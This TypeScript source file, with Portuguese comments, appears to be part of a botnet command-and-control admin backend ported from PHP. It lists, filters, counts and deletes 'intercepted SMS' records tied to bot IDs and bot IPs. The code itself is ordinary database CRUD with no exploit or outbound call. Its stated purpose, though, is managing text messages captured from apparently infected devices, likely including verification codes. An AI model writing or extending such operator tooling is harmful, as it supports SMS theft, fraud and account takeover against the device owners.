// api/src/admin-api/sms.ts
// Controlador de SMS Interceptados para API administrativa
// Adaptado de admin.class.php (process_sms) e bots.class.php (draw_sms)

import { SupabaseClient } from '@supabase/supabase-js';

// ----------------------------------------------------------------------
// Tipos
// ----------------------------------------------------------------------
export interface SmsEntry {
  id: number;
  bot_id: string;
  number: string;
  time: string;
  msg: string;
  ip?: string;       // Pode vir de join com bots, se disponível
}

export interface ListSmsFilters {
  botId?: string;
  number?: string;
  text?: string;
  page?: number;
  rows?: number;
}

export interface CommandResult {
  success: boolean;
  message: string;
  data?: any;
}

// ----------------------------------------------------------------------
// listSms – lista SMS com paginação e filtros
// ----------------------------------------------------------------------
export async function listSms(
  supabase: SupabaseClient,
  filters: ListSmsFilters = {},
): Promise<{ sms: SmsEntry[]; total: number }> {
  try {
    const page = filters.page || 0;
    const rows = filters.rows || 40;
    const from = page * rows;
    const to = from + rows - 1;

    let query = supabase
      .from('sms')
      .select('*', { count: 'exact' });

    if (filters.botId) {
      query = query.eq('bot_id', filters.botId);
    }
    if (filters.number) {
      query = query.like('number', `%${filters.number}%`);
    }
    if (filters.text) {
      query = query.like('msg', `%${filters.text}%`);
    }

    query = query.order('id', { ascending: false }).range(from, to);

    const { data, error, count } = await query;
    if (error) throw error;

    return {
      sms: (data as SmsEntry[]) || [],
      total: count || 0,
    };
  } catch (err) {
    console.error('listSms error:', err);
    throw err;
  }
}

// ----------------------------------------------------------------------
// deleteSms – deleta um ou mais SMS
// ----------------------------------------------------------------------
export async function deleteSms(
  supabase: SupabaseClient,
  ids: number[],
): Promise<CommandResult> {
  try {
    if (!ids || ids.length === 0) {
      return { success: false, message: 'No SMS IDs provided' };
    }

    const { error } = await supabase
      .from('sms')
      .delete()
      .in('id', ids);

    if (error) throw error;

    return { success: true, message: `${ids.length} SMS deleted` };
  } catch (err) {
    console.error('deleteSms error:', err);
    return { success: false, message: 'Error deleting SMS' };
  }
}

// ----------------------------------------------------------------------
// getSmsCount – retorna a contagem de SMS (total ou de um bot específico)
// ----------------------------------------------------------------------
export async function getSmsCount(
  supabase: SupabaseClient,
  botId?: string,
): Promise<number> {
  try {
    let query = supabase
      .from('sms')
      .select('id', { count: 'exact', head: true });

    if (botId) {
      query = query.eq('bot_id', botId);
    }

    const { count, error } = await query;
    if (error) throw error;

    return count || 0;
  } catch (err) {
    console.error('getSmsCount error:', err);
    throw err;
  }
}